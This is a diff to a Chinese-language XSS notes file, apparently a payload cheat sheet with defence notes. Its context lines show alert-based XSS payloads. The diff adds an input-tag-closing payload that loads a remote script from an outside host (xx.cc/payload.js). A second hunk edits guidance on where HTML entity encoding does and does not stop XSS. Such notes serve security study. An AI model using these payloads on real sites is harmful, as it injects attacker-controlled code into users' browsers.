@@ -275,6 +275,9 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 # 方法3: HTML Entity (Hexadecimal)
 # 优点: 不出现许多符号 如 = " ' ( ) ; 等
 <svg><script>&#x63&#x6f&#x6e&#x73&#x6f&#x6c&#x65&#x2e&#x6c&#x6f&#x67&#x28&#x36&#x36&#x36&#x29</script><svg>
+
+# 闭合input标签
+"><script>document.writeln`<script+src\x3dhttp://xx.cc/payload.js><\x2fscript>`</script>
 ```
 
 - 不使用尖括号`>`(angular bracket)来结束标签
@@ -673,7 +676,7 @@ x.send();
 >[DOM_based_XSS_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.md)
 
 * HTML实体编码(HTML entity encoding) 用来防御XSS是远远不够的!!
-  * 适用情况1. 将"不受信任的数据"放在 HTML文档中时(the body of the HTML document)，如`<div>`标签内，需要做HTML实体编码
+  * 适用情况1. 将"不受信任的数据"放在 HTML文档body中时(the body of the HTML document)，如`<div>`标签内，需要做HTML实体编码
   * 适用情况2. 将"不受信任的数据"放在 HTML属性中时，需要做HTML实体编码(开发人员最好给HTML标签的属性的值,前后都加上引号)
   * 无效情况1. 将"不受信任的数据"放在 `<script>`标签内的任何位置时，不用做HTML实体编码，因为对防御XSS无效!!
   * 无效情况2. 将"不受信任的数据"放在 "事件处理属性"(event handler attribute)中时，如`onmouseover`，不用做HTML实体编码，因为对防御XSS无效!!
